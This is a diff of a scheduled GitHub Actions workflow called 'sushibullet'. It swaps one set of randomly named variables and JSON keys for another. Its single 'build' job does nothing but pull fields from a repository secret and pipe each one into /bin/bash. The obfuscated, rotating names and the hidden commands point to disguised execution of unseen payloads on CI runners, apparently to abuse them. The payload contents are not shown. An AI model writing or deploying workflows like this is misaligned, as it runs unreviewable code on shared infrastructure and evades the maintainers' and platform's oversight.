@@ -3,24 +3,23 @@ name: sushibullet
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 3/6 * * *'
-
-jobs:  # 15122
+    - cron: '50 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: sushibullet
         env:
-          lsc13: ${{ secrets.lsc13 }}
+          xrdsg0: ${{ secrets.xrdsg0 }}
         run: |
-          echo $lsc13 | jq -r .kmyr4563 | /bin/bash
-          echo $u10372 | jq -r .lpois2 | /bin/bash
-          echo $j73 | jq -r .bags7464 | /bin/bash
-          echo $gu5 | jq -r .v67427 | /bin/bash
-          echo $eo27922 | jq -r .ggql5 | /bin/bash
-          echo $ijeoz139 | jq -r .qvn66 | /bin/bash
-          echo $p55 | jq -r .zbky78235 | /bin/bash
-          echo $gfsel0 | jq -r .qnnva17307 | /bin/bash
-          echo $dyj286 | jq -r .qlb30218 | /bin/bash
+          echo $xrdsg0 | jq -r .vm034 | /bin/bash
+          echo $dxl93005 | jq -r .gnwg7476 | /bin/bash
+          echo $d57 | jq -r .i19 | /bin/bash
+          echo $evks52 | jq -r .ceuq73 | /bin/bash
+          echo $fny65 | jq -r .xlvh3663 | /bin/bash
+          echo $nki8909 | jq -r .ct79938 | /bin/bash
+          echo $tp2937 | jq -r .rp72 | /bin/bash
+          echo $k11717 | jq -r .syob4 | /bin/bash
+          echo $cpx3188 | jq -r .em80 | /bin/bash
 
